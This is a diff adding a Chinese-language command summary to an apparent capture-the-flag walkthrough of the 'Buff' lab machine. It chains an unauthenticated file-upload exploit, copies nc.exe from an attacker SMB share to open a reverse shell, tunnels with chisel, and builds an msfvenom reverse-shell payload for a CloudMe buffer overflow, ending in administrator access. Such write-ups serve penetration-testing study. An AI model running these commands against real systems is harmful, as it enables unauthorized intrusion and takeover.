@@ -4,6 +4,99 @@
 #### 操作命令:msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.134 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 ### 方法一：https://www.exploit-db.com/exploits/48389 ：CloudMe 1.11.2 - Buffer Overflow (PoC)
 ### 方法二：[★]$ searchsploit cloudme
+### 总结
+```
+
+竟然有个7680/tcp filtered pando-pub端口扫描不到
+[★]$ nmap -p- --min-rate 1000 -oA nmap-alltcp 10.129.2.18
+
+[★]$ gobuster dir -u http://10.129.2.18:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40 -o gobuster-root-small-php
+
+[★]$ searchsploit gym management
+[★]$ searchsploit -m php/webapps/48506.py
+
+// 我们可以从这里下载健身房管理软件。让我们看一下源代码理解它是如何工作的。
+https://projectworlds.com/free-projects/php-projects/gym-management-system-project-in-php/
+[★]$ unzip Gym-Management-System-Project-in-PHP.zip
+[★]$ cat upload.php
+根据对该应用程序的公开分析，upload.php存在漏洞是因为应用程序不检查用户是否经过身份验证。
+
+在PNG里插入反弹shell的python:[★]$ cat upload.py
+
+PNG_magicBytes = '\x89\x50\x4e\x0d\x0a\x1a'
+[★]$ python3 upload.py
+Uploaded!
+
+
+[★]$ python2 -version
+[★]$ pyenv shell 2.7.18
+[★]$ python2 --version
+Python 2.7.18
+[★]$ python2 -m pip install requests
+[★]$ python2 -m pip install colorama
+[★]$ python2 48506.py http://10.129.2.18:8080/
+
+这个靶机遇到的问题就是无法使用python3 -m http.server Port
+[★]$ smbserver.py share . -smb2support 
+
+C:\xampp\htdocs\gym\upload> net use \\10.10.14.134\share
+C:\xampp\htdocs\gym\upload> copy \\10.10.14.134\share\nc64.exe C:\programdata\nc.exe
+C:\xampp\htdocs\gym\upload> \programdata\nc.exe -e cmd 10.10.14.134 443
+
+[★]$ sudo nc -lvnp 443
+
+C:\xampp\htdocs\gym\upload>netstat -ano | findstr TCP | findstr ":0"
+  TCP    [::]:8080              [::]:0                 LISTENING       8768
+
+任务列表中获取进程ID（8768）并为其grep（或findstr）（侦听进程ID每分钟都在变化，因此我必须快速搜索）：
+C:\xampp\htdocs\gym\upload>tasklist /v | findstr 8768
+httpd.exe                     8768                            0         92 K Unknown         BUFF\shaun        
+
+ Directory of C:\Users\shaun\Downloads
+
+14/07/2020  12:27    <DIR>          .
+14/07/2020  12:27    <DIR>          ..
+16/06/2020  15:26        17,830,824 CloudMe_1112.exe //二进制文件监听的是本地主机上的是8888端口
+
+[★]$ searchsploit cloudme
+
+在https://github.com/jpillora/chisel/releases下载chisel_1.6.0_windows_amd64
+
+chisel 的作用只有一个词：
+🔁 端口转发（隧道）
+你做的是：
+👉 把「目标机的 8888」
+👉 映射到「你攻击机的 8888」
+
+[★]$ gunzip chisel_1.6.0_windows_amd64.gz
+C:\ProgramData>net use \\10.10.14.134\share
+C:\ProgramData>copy \\10.10.14.134\share\chisel_1.6.0_windows_amd64 c.exe
+C:\ProgramData>.\c.exe client 10.10.14.134:8000 R:8888:localhost:8888
+
+[★]$ gunzip chisel_1.6.0_linux_amd64.gz
+[★]$ chmod 777 chisel_1.6.0_linux_amd64
+[★]$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
+
+[★]$ netstat -ntlp
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      128098/./chisel_1.6 
+tcp6       0      0 :::8000                 :::*                    LISTEN      128098/./chisel_1.6 
+
+CloudMe_1.11.2.exe //二进制文件监听的是本地主机上的是8888端口
+
+[★]$ searchsploit cloudme
+[★]$ searchsploit -m windows/remote/48389.py 
+
+[★]$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.134 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
+[★]$ vi 48389.py
+[★]$ python3 48389.py
+
+
+[★]$ sudo nc -lvnp 443
+C:\Windows\system32>whoami
+whoami
+buff\administrator
+
+```
 ```
 [★]$ nmap -sC -sV 10.129.2.18
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 03:10 CST
